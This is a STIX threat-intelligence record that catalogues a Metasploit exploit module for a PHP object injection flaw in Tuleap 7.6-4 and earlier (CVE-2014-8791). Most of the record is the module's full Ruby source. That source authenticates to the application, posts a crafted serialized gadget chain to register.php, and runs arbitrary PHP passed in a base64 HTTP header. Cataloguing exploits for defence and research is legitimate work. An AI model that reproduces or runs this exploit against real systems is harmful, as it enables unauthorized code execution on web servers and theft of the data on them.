{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8462b3bf-9e9c-442d-a3c9-48b176271198",
    "created": "2024-08-14T17:13:34.475141Z",
    "modified": "2024-08-14T17:13:34.475145Z",
    "name": "Tuleap PHP Unserialize Code Execution",
    "description": " This module exploits a PHP object injection vulnerability in Tuleap <= 7.6-4 which could be abused to allow authenticated users to execute arbitrary code with the permissions of the web server. The dangerous unserialize() call exists in the 'src/www/project/register.php' file. The exploit abuses the destructor method from the Jabbex class in order to reach a call_user_func_array() call in the Jabber class and call the fetchPostActions() method from the Transition_PostAction_FieldFactory class to execute PHP code through an eval() call. In order to work, the target must have the 'sys_create_project_in_one_step' option disabled.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/tuleap_unserialize_exec.rb",
            "external_id": "tuleap_unserialize_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-8791"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2014-13"
        },
        {
            "source_name": "reference",
            "url": "https://tuleap.net/plugins/tracker/?aid=7601"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Tuleap PHP Unserialize Code Execution',\n      'Description'    => %q{\n        This module exploits a PHP object injection vulnerability in Tuleap <= 7.6-4 which could be\n        abused to allow authenticated users to execute arbitrary code with the permissions of the\n        web server. The dangerous unserialize() call exists in the 'src/www/project/register.php'\n        file. The exploit abuses the destructor method from the Jabbex class in order to reach a\n        call_user_func_array() call in the Jabber class and call the fetchPostActions() method from\n        the Transition_PostAction_FieldFactory class to execute PHP code through an eval() call. In\n        order to work, the target must have the 'sys_create_project_in_one_step' option disabled.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'EgiX',\n      'References'     =>\n        [\n          ['CVE', '2014-8791'],\n          ['URL', 'http://karmainsecurity.com/KIS-2014-13'],\n          ['URL', 'https://tuleap.net/plugins/tracker/?aid=7601']\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Generic (PHP Payload)', {}]],\n      'DisclosureDate' => '2014-11-27',\n      'DefaultTarget'  => 0))\n\n      register_options(\n      [\n        OptString.new('TARGETURI', [true, \"The base path to the web application\", \"/\"]),\n        OptString.new('USERNAME', [true, \"The username to authenticate with\" ]),\n        OptString.new('PASSWORD', [true, \"The password to authenticate with\" ]),\n        OptBool.new('SSL', [true, \"Negotiate SSL for outgoing connections\", true]),\n        Opt::RPORT(443)\n      ])\n  end\n\n  def check\n    flag = rand_text_alpha(rand(10)+20)\n    res = exec_php(\"print #{flag};\")\n\n    if res and res.body and res.body.to_s =~ /#{flag}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def do_login()\n    print_status(\"Logging in...\")\n\n    username = datastore['USERNAME']\n    password = datastore['PASSWORD']\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'account/login.php'),\n      'vars_post' => {'form_loginname' => username, 'form_pw' => password}\n    })\n\n    unless res && res.code == 302\n      fail_with(Failure::NoAccess, \"#{peer} - Login failed with #{username}:#{password}\")\n    end\n\n    print_good(\"Login Successful (#{username}:#{password})\")\n    res.get_cookies\n  end\n\n  def exec_php(php_code)\n    session_cookies = do_login()\n\n    chain =  'O:6:\"Jabbex\":2:{S:15:\"\\00Jabbex\\00handler\";O:12:\"EventHandler\":1:{S:27:\"\\00EventHandler\\00authenticated\";b:1;}'\n    chain << 'S:11:\"\\00Jabbex\\00jab\";O:6:\"Jabber\":3:{S:8:\"_use_log\";i:1;S:11:\"_connection\";O:5:\"Chart\":0:{}S:15:\"_event_handlers\";'\n    chain << 'a:1:{S:9:\"debug_log\";a:2:{i:0;O:34:\"Transition_PostAction_FieldFactory\":1:{S:23:\"\\00*\\00post_actions_classes\";'\n    chain << 'a:1:{i:0;S:52:\"1;eval(base64_decode($_SERVER[HTTP_PAYLOAD]));die;//\";}}i:1;S:16:\"fetchPostActions\";}}}}'\n\n    send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'project/register.php'),\n      'cookie'    => session_cookies,\n      'vars_post' => {'data' => chain},\n      'headers'   => {'payload' => Rex::Text.encode_base64(php_code)}\n    }, 3)\n  end\n\n  def exploit\n    print_status(\"Exploiting the PHP object injection...\")\n    exec_php(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-27",
    "x_mitre_platforms": [
        "php'"
    ]
}